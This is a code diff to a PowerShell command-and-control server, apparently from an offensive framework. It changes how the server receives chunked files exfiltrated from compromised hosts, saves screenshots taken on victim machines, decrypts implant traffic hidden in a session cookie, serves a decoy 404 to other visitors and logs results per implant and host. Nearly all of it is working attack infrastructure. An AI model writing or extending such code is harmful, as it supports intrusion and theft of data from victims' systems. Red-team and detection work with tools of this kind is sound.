@@ -1720,14 +1546,50 @@ $message =[Convert]::ToBase64String($Bytes)
             $encryptedString = $buffer[1500..$size2]
             $cookiesin = $request.Cookies -replace 'SessionID=', ''
             $cookieplaintext = Decrypt-String $key $cookiesin          
-            
-            try {
-            $backToPlainText = Decrypt-String2 $key $encryptedString
-            }
-            catch{             
-            $backToPlainText = "Unable to decrypt message from host"
-            $error.clear()
-            $cookieplaintext = "Unable to decrypt message from host: $cookieplaintext. Could be too large and truncating data!"
+  
+            # if the task was to download a file, dump it directly to disk
+            if  ($cookieplaintext.tolower().startswith('download-file'))
+            {
+                try {
+                    $filebytes = Decrypt-Bytes $key $encryptedString
+                    $file = $cookieplaintext -replace "download-file ",""                    
+                    $canonicalizedPath = $file.Replace("..","")
+                    $PathSkipRoot = [FileClass]::GetRoot($canonicalizedPath.ToString())
+                    if (!$PathSkipRoot) {
+                        $PathSkipRoot = $canonicalizedPath.ToString() 
+                    }
+                    $fullPath = [System.IO.Path]::GetDirectoryName($PathSkipRoot)
+                    $dirPath = "$global:newdir\downloads\$($fullPath)"
+                    if (Test-Path $dirPath) { } else {
+                    $CreatedDirs = New-Item -ItemType Directory -Path $dirPath
+                    }
+                    $ramdomfilename = Get-RandomURI -Length 5
+                    $targetfile = "$global:newdir\downloads\$($PathSkipRoot)"
+                    [int]$chunkNumber = [System.Text.Encoding]::UTF8.GetString($filebytes[0..4])
+                    [int]$totalChunks = [System.Text.Encoding]::UTF8.GetString($filebytes[5..9])
+                    $filebytes = $filebytes[10..($filebytes.Length)]
+                    $wStream = new-object IO.FileStream $targetfile, ([System.IO.FileMode]::Append), ([IO.FileAccess]::Write), ([IO.FileShare]::Read)
+                    $wStream.Write($filebytes, 0, $filebytes.Length)
+                    $wStream.Close()
+                    $backToPlainText = "Downloaded file part $($chunkNumber) of $($totalChunks) : $targetfile 123456<>654321"
+                    if ($null -ne $br -and $br -is [System.IDisposable])
+                    {
+                        $br.Dispose()
+                    }
+                } catch {
+                    Echo $error[0]
+                    Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
+                    $backToPlainText = "File not downloaded, the size could be too large or the user may not have permissions!"
+                }
+            } else {           
+                try {
+                    $backToPlainText = Decrypt-String2 $key $encryptedString
+                }
+                catch{             
+                    $backToPlainText = "Unable to decrypt message from host"
+                    $error.clear()
+                    $cookieplaintext = "Unable to decrypt message from host: $cookieplaintext. Could be too large and truncating data!"
+                }
             }
             
             # if the task was a screenshot, dump it directly to disk
@@ -1736,42 +1598,22 @@ $message =[Convert]::ToBase64String($Bytes)
                 Add-Type -AssemblyName System.Windows.Forms
                 Add-Type -AssemblyName System.Drawing
                 try{
-                $randomimageid = Get-RandomURI -Length 15
-                $imagepath = "$global:newdir\downloads\$randomimageid.png"
-                #Convert Base64 to Image
-                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''
-                $imageBytes = [Convert]::FromBase64String($backToPlainText)
-                $ms = New-Object -TypeName IO.MemoryStream -ArgumentList ($imageBytes, 0, $imageBytes.Length)
-                $ms.Write($imageBytes, 0, $imageBytes.Length)
-                $image = [System.Drawing.Image]::FromStream($ms, $true)
-                $image.Save("$imagepath")
-                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
+                    $randomimageid = Get-RandomURI -Length 15
+                    $imagepath = "$global:newdir\downloads\$randomimageid.png"
+                    #Convert Base64 to Image
+                    $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''
+                    $imageBytes = [Convert]::FromBase64String($backToPlainText)
+                    $ms = New-Object -TypeName IO.MemoryStream -ArgumentList ($imageBytes, 0, $imageBytes.Length)
+                    $ms.Write($imageBytes, 0, $imageBytes.Length)
+                    $image = [System.Drawing.Image]::FromStream($ms, $true)
+                    $image.Save("$imagepath")
+                    $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
                 }
                 catch {
-                $backToPlainText = "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
-                Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
+                    $backToPlainText = "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
+                    Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
                 }
                 $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
-            }
-            # if the task was to download a file, dump it directly to disk
-            if  ($cookieplaintext.tolower().startswith('download-file'))
-            {
-                try {
-                $file = split-path $cookieplaintext -leaf
-                $file = $file -replace "'", ""
-                $fileext = $file.split('\.')[-1]
-                $filename = $file.split('\.')[0]
-                $ramdomfilename = Get-RandomURI -Length 5
-                $targetfile = "$global:newdir\downloads\$($filename)__$($ramdomfilename).$($fileext)"   
-                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''        
-                $fileBytes = [Convert]::FromBase64String($backToPlainText)
-                [io.file]::WriteAllBytes($targetfile, $fileBytes)
-                write-host "Downloaded file: $targetfile" -ForegroundColor Green
-
-                } catch {
-                Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
-                }
-                $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
             }
 
             if ($backToPlainText -match '123456(.+?)654321')
@@ -1795,15 +1637,19 @@ $message =[Convert]::ToBase64String($Bytes)
     # if a web request comes in that is not for the c2 server, send default 404 response
     if (!$message) {
         $message = $httpresponse
-        Write-Output (Get-Date) | Out-File $global:newdir\Webserver.log -Append
-        Write-Output $request | Out-File $global:newdir\Webserver.log -Append
-    }
+        $datenow = (Get-Date)
+        $fileuri = ($request.Url).AbsoluteUri
+        $outfile = "$($datenow) $($request.HttpMethod) $($fileuri)"
+        Write-Output $outfile | Out-File $global:newdir\Webserver.log -Append
+    } 
+
     if ($exe) {
         $buffer = $message
         $exe = $false
     } else {
         [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
     }
+
     $response.ContentLength64 = $buffer.length
     $response.StatusCode = 200
     $response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
@@ -1814,18 +1660,22 @@ $message =[Convert]::ToBase64String($Bytes)
     $output.Close()
     $message = $null
     $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$taskiddb" -as PSObject
+
     if ($resultsdb)
     {
-    $ranuri = $resultsdb.RandomURI
-    $im_result = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
-    $implanthost = $im_result.User
-    $im = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
-
+        $ranuri = $resultsdb.RandomURI
+        $im_result = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
+        $implanthost = $im_result.User
+        $im = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
         $taskcompledtime = $resultsdb.TaskID
-        Write-Host "Command returned against host:" $im_result.Hostname $im_result.Domain "($taskcompledtime)" -ForegroundColor Green
+        $imID = $im_result.ImplantID
+        $imHost = $im_result.Hostname
+        $imDom = $im_result.Domain
+        Write-Host "Command returned against implant $imID on host $imHost $imDom ($taskcompledtime)" -ForegroundColor Green
         Write-Host -Object $resultsdb.Output -ForegroundColor Green
         $taskiddb ++
     }
+
 }
 
 $listener.Stop()
